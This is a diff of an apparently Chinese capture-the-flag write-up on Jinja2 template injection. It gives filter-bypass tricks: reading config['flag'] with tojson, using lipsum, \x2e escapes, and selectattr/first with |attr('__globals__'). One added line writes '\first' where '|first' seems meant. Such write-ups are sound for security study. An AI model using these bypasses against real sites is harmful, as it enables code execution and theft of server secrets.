-<p><strong>取密文：<code>{{config["flag"]|tojson}}</code>，然后 <code>json.loads</code> 还原成字符串再解。</strong></p>
-</details>
-<hr />
-<details class="note">
-<summary>这题踩的坑</summary>
-<p><strong>① 页面点不动就以为题坏了</strong></p>
-<p>是 jQuery 的 CDN 挂了。<strong>看到"能开但按钮没反应"，先看 Console 有没有 <code>$ is not defined</code>。</strong></p>
-<p><strong>② 用 <code>url_for</code> 想省事，结果写不出来</strong></p>
-<p><code>url_for</code> 名字里带下划线，而名字<strong>不能转义</strong>。改用 <code>lipsum</code>（名字干净）。</p>
-<p><strong>③ <code>x2e</code> 少了反斜杠</strong></p>
-<p>转义是 <code>\x2e</code>，不是 <code>x2e</code>。</p>
-<p><strong>④ 把 <code>\x2e</code> 用在语法位置</strong></p>
-<p><code>["os"]</code> 前面的那个点是<strong>语法</strong>，不能转义，只能换写法。</p>
-<p><strong>⑤ <code>listdir</code> 给了个文件</strong></p>
-<p>程序把异常吞成 <code>Exception</code>，看不出原因。<strong><code>listdir</code> 要目录，<code>open</code> 要文件。</strong></p>
+<p><strong><code>selectattr</code> 按属性名筛，<code>\first</code> 取第一个 —— 不需要知道它在第几个。</strong>
+<strong>如果连 <code>.__globals__</code> 这种形状都被过滤，就换成 <code>|attr('__globals__')</code>。</strong></p>
 </details>
     
     
